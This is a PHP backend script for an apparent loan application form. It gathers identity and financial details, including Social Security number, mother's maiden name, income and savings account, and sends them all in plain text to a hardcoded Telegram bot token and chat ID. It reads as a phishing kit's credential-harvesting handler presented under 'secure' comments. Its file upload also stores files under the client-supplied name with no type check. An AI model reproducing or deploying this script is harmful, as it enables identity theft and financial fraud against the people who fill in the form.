<?php
// Secure database connection (if needed)
// $db = pg_connect("host=yourhost port=yourport dbname=yourdb user=youruser password=yourpassword");

// Sanitize function to prevent XSS & SQL injection
function sanitize($data) {
    return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // Define form inputs
    $first_name = sanitize($_POST['q61_name[first]'] ?? '');
    $last_name = sanitize($_POST['q61_name[last]'] ?? '');
    $birth_day = sanitize($_POST['q62_birthDate62[day]'] ?? '');
    $birth_month = sanitize($_POST['q62_birthDate62[month]'] ?? '');
    $birth_year = sanitize($_POST['q62_birthDate62[year]'] ?? '');
    $marital_status = sanitize($_POST['q6_maritalStatus'] ?? '');
    $mothers_maiden = sanitize($_POST['q110_mothersMaiden110'] ?? '');
    $fathers_first = sanitize($_POST['q106_fathersFull[first]'] ?? '');
    $fathers_last = sanitize($_POST['q106_fathersFull[last]'] ?? '');
    $phone = sanitize($_POST['q72_phone[full]'] ?? '');
    $email = sanitize($_POST['q78_email78'] ?? '');
    
    // Address
    $address_line1 = sanitize($_POST['q76_address76[addr_line1]'] ?? '');
    $address_line2 = sanitize($_POST['q76_address76[addr_line2]'] ?? '');
    $city = sanitize($_POST['q76_address76[city]'] ?? '');
    $state = sanitize($_POST['q76_address76[state]'] ?? '');
    $postal_code = sanitize($_POST['q76_address76[postal]'] ?? '');
    
    // Employment & Financial Details
    $occupation = sanitize($_POST['q107_occupation107'] ?? '');
    $present_employer_first = sanitize($_POST['q105_presentEmployer[first]'] ?? '');
    $present_employer_last = sanitize($_POST['q105_presentEmployer[last]'] ?? '');
    $years_of_experience = sanitize($_POST['q79_yearsOf'] ?? '');
    $gross_monthly_income = sanitize($_POST['q80_grossMonthly80'] ?? '');
    $annual_income = sanitize($_POST['q88_annualIncome'] ?? '');
    $monthly_rent_mortgage = sanitize($_POST['q81_monthlyRentmortgage'] ?? '');
    $savings_account = sanitize($_POST['q109_savingsAccount'] ?? '');
    $desired_loan = sanitize($_POST['q87_desiredLoan87'] ?? '');
    $loan_purpose = sanitize($_POST['q89_loanWill'] ?? '');
    $social_security = sanitize($_POST['q92_socialSecurity'] ?? '');
    
    // Process file uploads securely
    $uploadDir = "uploads/";
    $uploadedFiles = [];
    if (!empty($_FILES['q94_uploadSelected94'])) {
        $file = $_FILES['q94_uploadSelected94'];
        if ($file['error'] === UPLOAD_ERR_OK) {
            $filename = basename($file['name']);
            $targetPath = $uploadDir . $filename;
            if (move_uploaded_file($file['tmp_name'], $targetPath)) {
                $uploadedFiles['q94_uploadSelected94'] = $targetPath;
            }
        }
    }
    
    // Send data to Telegram (if required)
    $telegramToken = "7810816894:AAE7eOvKsbTjvCr3zdpgsIf-vXqddsYY0Rk";
    $chatID = "7678714988";
    
    $message = "New Form Submission:\n" .
               "Name: $first_name $last_name\n" .
               "DOB: $birth_day-$birth_month-$birth_year\n" .
               "Marital Status: $marital_status\n" .
               "Mother's Maiden Name: $mothers_maiden\n" .
               "Father's Name: $fathers_first $fathers_last\n" .
               "Phone: $phone\n" .
               "Email: $email\n" .
               "Address: $address_line1, $address_line2, $city, $state, $postal_code\n" .
               "Occupation: $occupation\n" .
               "Employer: $present_employer_first $present_employer_last\n" .
               "Years of Experience: $years_of_experience\n" .
               "Gross Monthly Income: $gross_monthly_income\n" .
               "Annual Income: $annual_income\n" .
               "Monthly Rent/Mortgage: $monthly_rent_mortgage\n" .
               "Savings Account: $savings_account\n" .
               "Desired Loan: $desired_loan\n" .
               "Loan Purpose: $loan_purpose\n" .
               "Social Security: $social_security\n";
    
    $telegramURL = "https://api.telegram.org/bot$telegramToken/sendMessage";
    $postData = [
        'chat_id' => $chatID,
        'text' => $message
    ];
    file_get_contents($telegramURL . "?" . http_build_query($postData));
    
    // Respond to user
    // echo json_encode(["status" => "success", "message" => "Form submitted successfully."]);
}
?>
